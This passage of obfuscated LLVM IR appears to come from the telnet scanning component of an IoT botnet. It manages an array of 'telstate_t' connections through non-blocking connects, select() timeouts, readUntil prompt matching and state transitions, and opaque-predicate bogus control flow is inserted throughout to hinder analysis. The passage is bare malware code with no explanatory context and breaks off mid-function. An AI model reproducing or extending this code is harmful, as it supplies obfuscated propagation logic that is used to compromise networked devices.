  %213 = load i32, i32* %10, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = bitcast %struct.timeval* %18 to i8*
  %219 = call i32 @setsockopt(i32 %217, i32 1, i32 20, i8* %218, i32 16) #2
  %220 = load i32, i32* %10, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 16
  %225 = bitcast %struct.timeval* %18 to i8*
  %226 = call i32 @setsockopt(i32 %224, i32 1, i32 21, i8* %225, i32 16) #2
  %227 = load i32, i32* %10, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 16
  %232 = icmp eq i32 %231, -1
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %195
  br label %3344

; <label>:234:                                    ; preds = %195
  %235 = load i32, i32* %10, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 16
  %240 = load i32, i32* %10, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 16
  %245 = call i32 (i32, i32, ...) @fcntl(i32 %244, i32 3, i8* null)
  %246 = or i32 %245, 2048
  %247 = call i32 (i32, i32, ...) @fcntl(i32 %239, i32 4, i32 %246)
  %248 = load i32, i32* %10, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %249
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %250, i32 0, i32 0
  %252 = load i32, i32* %251, align 16
  %253 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %254 = call i32 @connect(i32 %252, %struct.sockaddr* %253, i32 16)
  %255 = icmp eq i32 %254, -1
  br i1 %255, label %256, label %271

; <label>:256:                                    ; preds = %234
  %257 = call i32* @__errno_location() #13
  %258 = load i32, i32* %257, align 4
  %259 = icmp ne i32 %258, 115
  br i1 %259, label %260, label %271

; <label>:260:                                    ; preds = %256
  %261 = load i32, i32* %10, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %262
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 16
  %266 = call i32 @sclose(i32 %265)
  %267 = load i32, i32* %10, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 3
  store i8 1, i8* %270, align 1
  br label %296

; <label>:271:                                    ; preds = %256, %234
  %272 = load i32, i32* @x.67
  %273 = load i32, i32* @y.68
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %271
  %280 = load i32, i32* %10, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 2
  store i8 1, i8* %283, align 8
  %284 = load i32, i32* %10, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 6
  store i32 0, i32* %287, align 4
  %288 = load i32, i32* @x.67
  %289 = load i32, i32* @y.68
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %296

; <label>:296:                                    ; preds = %originalBBpart228, %260
  %297 = load i32, i32* @x.67
  %298 = load i32, i32* @y.68
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %296
  %305 = load i32, i32* @x.67
  %306 = load i32, i32* @y.68
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %3327

; <label>:313:                                    ; preds = %101
  %314 = load i32, i32* @x.67
  %315 = load i32, i32* @y.68
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %313
  %322 = load i32, i32* %10, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 6
  %326 = load i32, i32* %325, align 4
  %327 = icmp eq i32 %326, 0
  %328 = load i32, i32* @x.67
  %329 = load i32, i32* @y.68
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %327, label %336, label %343

; <label>:336:                                    ; preds = %originalBBpart236
  %337 = call i64 @time(i64* null) #2
  %338 = trunc i64 %337 to i32
  %339 = load i32, i32* %10, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 6
  store i32 %338, i32* %342, align 4
  br label %343

; <label>:343:                                    ; preds = %336, %originalBBpart236
  br label %344

; <label>:344:                                    ; preds = %343
  %345 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %346 = getelementptr inbounds [16 x i64], [16 x i64]* %345, i64 0, i64 0
  %347 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %346) #2, !srcloc !5
  %348 = extractvalue { i64, i64* } %347, 0
  %349 = extractvalue { i64, i64* } %347, 1
  %350 = trunc i64 %348 to i32
  store i32 %350, i32* %20, align 4
  %351 = ptrtoint i64* %349 to i64
  %352 = trunc i64 %351 to i32
  store i32 %352, i32* %21, align 4
  br label %353

; <label>:353:                                    ; preds = %344
  %354 = load i32, i32* @x.67
  %355 = load i32, i32* @y.68
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %353
  %362 = load i32, i32* @x.67
  %363 = load i32, i32* @y.68
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %370

; <label>:370:                                    ; preds = %originalBBpart240
  %371 = load i32, i32* @x.67
  %372 = load i32, i32* @y.68
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %370
  %379 = load i32, i32* %10, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 0
  %383 = load i32, i32* %382, align 16
  %384 = srem i32 %383, 64
  %385 = zext i32 %384 to i64
  %386 = shl i64 1, %385
  %387 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %388 = load i32, i32* %10, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 0
  %392 = load i32, i32* %391, align 16
  %393 = sdiv i32 %392, 64
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds [16 x i64], [16 x i64]* %387, i64 0, i64 %394
  %396 = load i64, i64* %395, align 8
  %397 = or i64 %396, %386
  store i64 %397, i64* %395, align 8
  %398 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %398, align 8
  %399 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %399, align 8
  %400 = load i32, i32* %10, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 0
  %404 = load i32, i32* %403, align 16
  %405 = add nsw i32 %404, 1
  %406 = call i32 @select(i32 %405, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %406, i32* %11, align 4
  %407 = load i32, i32* %11, align 4
  %408 = icmp eq i32 %407, 1
  %409 = load i32, i32* @x.67
  %410 = load i32, i32* @y.68
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart273, label %originalBB42alteredBB

originalBBpart273:                                ; preds = %originalBB42
  br i1 %408, label %417, label %474

; <label>:417:                                    ; preds = %originalBBpart273
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %418 = load i32, i32* %10, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 16
  %423 = bitcast i32* %15 to i8*
  %424 = call i32 @getsockopt(i32 %422, i32 1, i32 4, i8* %423, i32* %14) #2
  %425 = load i32, i32* %15, align 4
  %426 = icmp ne i32 %425, 0
  br i1 %426, label %427, label %442

; <label>:427:                                    ; preds = %417
  %428 = load i32, i32* %10, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 0
  %432 = load i32, i32* %431, align 16
  %433 = call i32 @sclose(i32 %432)
  %434 = load i32, i32* %10, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 2
  store i8 0, i8* %437, align 8
  %438 = load i32, i32* %10, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 3
  store i8 1, i8* %441, align 1
  br label %473

; <label>:442:                                    ; preds = %417
  %443 = load i32, i32* %10, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = load i32, i32* %10, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %452, i32 3, i8* null)
  %454 = and i32 %453, -2049
  %455 = call i32 (i32, i32, ...) @fcntl(i32 %447, i32 4, i32 %454)
  %456 = load i32, i32* %10, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 6
  store i32 0, i32* %459, align 4
  %460 = load i32, i32* %10, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 7
  store i16 0, i16* %463, align 16
  %464 = load i32, i32* %10, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 8
  %468 = load i8*, i8** %467, align 8
  call void @llvm.memset.p0i8.i64(i8* %468, i8 0, i64 1024, i32 1, i1 false)
  %469 = load i32, i32* %10, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 2
  store i8 2, i8* %472, align 8
  br label %3344

; <label>:473:                                    ; preds = %427
  br label %493

; <label>:474:                                    ; preds = %originalBBpart273
  %475 = load i32, i32* %11, align 4
  %476 = icmp eq i32 %475, -1
  br i1 %476, label %477, label %492

; <label>:477:                                    ; preds = %474
  %478 = load i32, i32* %10, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = call i32 @sclose(i32 %482)
  %484 = load i32, i32* %10, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 2
  store i8 0, i8* %487, align 8
  %488 = load i32, i32* %10, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 3
  store i8 1, i8* %491, align 1
  br label %492

; <label>:492:                                    ; preds = %477, %474
  br label %493

; <label>:493:                                    ; preds = %492, %473
  %494 = load i32, i32* @x.67
  %495 = load i32, i32* @y.68
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %493
  %502 = load i32, i32* %10, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 6
  %506 = load i32, i32* %505, align 4
  %507 = add i32 %506, 10
  %508 = zext i32 %507 to i64
  %509 = call i64 @time(i64* null) #2
  %510 = icmp slt i64 %508, %509
  %511 = load i32, i32* @x.67
  %512 = load i32, i32* @y.68
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBBpart295, label %originalBB75alteredBB

originalBBpart295:                                ; preds = %originalBB75
  br i1 %510, label %519, label %534

; <label>:519:                                    ; preds = %originalBBpart295
  %520 = load i32, i32* %10, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 0
  %524 = load i32, i32* %523, align 16
  %525 = call i32 @sclose(i32 %524)
  %526 = load i32, i32* %10, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 2
  store i8 0, i8* %529, align 8
  %530 = load i32, i32* %10, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 3
  store i8 1, i8* %533, align 1
  br label %534

; <label>:534:                                    ; preds = %519, %originalBBpart295
  %535 = load i32, i32* @x.67
  %536 = load i32, i32* @y.68
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %534
  %543 = load i32, i32* @x.67
  %544 = load i32, i32* @y.68
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %3327

; <label>:551:                                    ; preds = %101
  %552 = load i32, i32* %10, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 6
  %556 = load i32, i32* %555, align 4
  %557 = icmp eq i32 %556, 0
  br i1 %557, label %558, label %581

; <label>:558:                                    ; preds = %551
  %559 = load i32, i32* @x.67
  %560 = load i32, i32* @y.68
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %558
  %567 = call i64 @time(i64* null) #2
  %568 = trunc i64 %567 to i32
  %569 = load i32, i32* %10, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 6
  store i32 %568, i32* %572, align 4
  %573 = load i32, i32* @x.67
  %574 = load i32, i32* @y.68
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %581

; <label>:581:                                    ; preds = %originalBBpart2103, %551
  %582 = load i32, i32* %10, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 0
  %586 = load i32, i32* %585, align 16
  %587 = load i32, i32* %10, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 8
  %591 = load i8*, i8** %590, align 8
  %592 = load i32, i32* %10, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %594, i32 0, i32 7
  %596 = load i16, i16* %595, align 16
  %597 = zext i16 %596 to i32
  %598 = call i32 @readUntil(i32 %586, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %591, i32 1024, i32 %597)
  %599 = icmp ne i32 %598, 0
  br i1 %599, label %600, label %632

; <label>:600:                                    ; preds = %581
  %601 = load i32, i32* %10, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 6
  store i32 0, i32* %604, align 4
  %605 = load i32, i32* %10, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 7
  store i16 0, i16* %608, align 16
  %609 = load i32, i32* %10, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 8
  %613 = load i8*, i8** %612, align 8
  %614 = call i8* @strstr(i8* %613, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %615 = icmp ne i8* %614, null
  br i1 %615, label %616, label %621

; <label>:616:                                    ; preds = %600
  %617 = load i32, i32* %10, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 2
  store i8 5, i8* %620, align 8
  br label %627

; <label>:621:                                    ; preds = %600
  %622 = load i32, i32* %10, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 8
  %626 = load i8*, i8** %625, align 8
  call void @llvm.memset.p0i8.i64(i8* %626, i8 0, i64 1024, i32 1, i1 false)
  br label %627

; <label>:627:                                    ; preds = %621, %616
  %628 = load i32, i32* %10, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 2
  store i8 3, i8* %631, align 8
  br label %3344

; <label>:632:                                    ; preds = %581
  %633 = load i32, i32* %10, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 0
  %637 = load i32, i32* %636, align 16
  %638 = load i32, i32* %10, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 8
  %642 = load i8*, i8** %641, align 8
  %643 = load i32, i32* %10, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 7
  %647 = load i16, i16* %646, align 16
  %648 = zext i16 %647 to i32
  %649 = call i32 @readUntil(i32 %637, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %642, i32 1024, i32 %648)
  %650 = icmp ne i32 %649, 0
  br i1 %650, label %651, label %731

; <label>:651:                                    ; preds = %632
  %652 = load i32, i32* %10, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 6
  store i32 0, i32* %655, align 4
  %656 = load i32, i32* %10, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 7
  store i16 0, i16* %659, align 16
  %660 = load i32, i32* %10, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 8
  %664 = load i8*, i8** %663, align 8
  %665 = call i8* @strstr(i8* %664, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %666 = icmp ne i8* %665, null
  br i1 %666, label %667, label %688

; <label>:667:                                    ; preds = %651
  %668 = load i32, i32* @x.67
  %669 = load i32, i32* @y.68
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %667
  %676 = load i32, i32* %10, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 2
  store i8 5, i8* %679, align 8
  %680 = load i32, i32* @x.67
  %681 = load i32, i32* @y.68
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %710

; <label>:688:                                    ; preds = %651
  %689 = load i32, i32* @x.67
  %690 = load i32, i32* @y.68
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %688
  %697 = load i32, i32* %10, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 8
  %701 = load i8*, i8** %700, align 8
  call void @llvm.memset.p0i8.i64(i8* %701, i8 0, i64 1024, i32 1, i1 false)
  %702 = load i32, i32* @x.67
  %703 = load i32, i32* @y.68
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %710

; <label>:710:                                    ; preds = %originalBBpart2111, %originalBBpart2107
  %711 = load i32, i32* @x.67
  %712 = load i32, i32* @y.68
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %710
  %719 = load i32, i32* %10, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 2
  store i8 3, i8* %722, align 8
  %723 = load i32, i32* @x.67
  %724 = load i32, i32* @y.68
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
